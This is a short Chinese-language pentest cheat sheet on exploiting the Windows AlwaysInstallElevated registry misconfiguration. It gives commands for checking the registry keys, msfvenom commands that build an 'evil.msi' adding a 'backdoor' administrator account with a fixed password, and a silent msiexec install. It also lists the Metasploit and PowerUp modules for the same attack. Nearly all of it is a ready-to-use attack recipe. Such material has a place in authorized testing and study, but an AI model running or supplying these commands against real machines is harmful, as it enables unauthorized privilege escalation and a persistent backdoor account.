# 注册表配置错误-AlwaysInstallElevated

**原理：MSI 文件是用于安装应用程序的软件包文件。这些文件用安装它们的用户的权限运行**

**先决条件：检查这些注册表值是否设置为“1””(0x1)“。必须启用两个注册表设置才能使其正常工作，若缺任一则不可用**

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```

**若符合先决条件，则创建一个MSI文件，并安装它**

```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```

**MSF 模块：**

exploit/windows/local/always_install_elevated

**PowerUp 模块：**

Get-RegAlwaysInstallElevated

Write-UserAddMSI